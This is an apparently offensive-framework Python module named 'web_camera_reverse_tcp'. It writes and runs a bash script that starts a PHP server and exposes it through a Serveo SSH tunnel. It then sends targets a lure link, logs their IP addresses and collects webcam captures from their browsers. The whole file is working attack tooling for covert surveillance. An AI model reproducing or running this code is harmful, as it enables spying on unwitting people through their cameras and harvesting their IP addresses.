import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "web_camera_reverse_tcp",
        "title"       : "Tking pictures",
        "module"      : "payloads/web/camera/reverse_tcp android windows linux browser chrome firefox opera",
        "description" : "Use browser and take pictures"
}

options ={
  "LPORT" : [str(var.lport[0]),'The listen port']
}

def running():
        try:
                        print ("")
                        print (blue+"[*]"+default+ "Create a backdour")
                        time.sleep(2)
                        print ("")
                        time.sleep(2)
                        print ("")
                        mark = '"'     
                        f = open("waf/modules/payloads/web/camera/say.sh" , 'w')
                        f.write('''
rm -rf say.sh
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}
checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' index2.html > index.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R whoami:80:localhost:'''+var.lport[0]+''' serveo.net  2> /dev/null > sendlink ' 
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'''+var.lport[0]+''' serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:'''+var.lport[0]+''')\e[0m\n"
fuser -k '''+var.lport[0]+'''/tcp > /dev/null 2>&1
php -S localhost:'''+var.lport[0]+''' > /dev/null 2>&1 &
}
start() {
server
payload
checkfound
}
start	

        ''')
                        f.close()
                        os.system('bash waf/modules/payloads/web/camera/say.sh')

        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
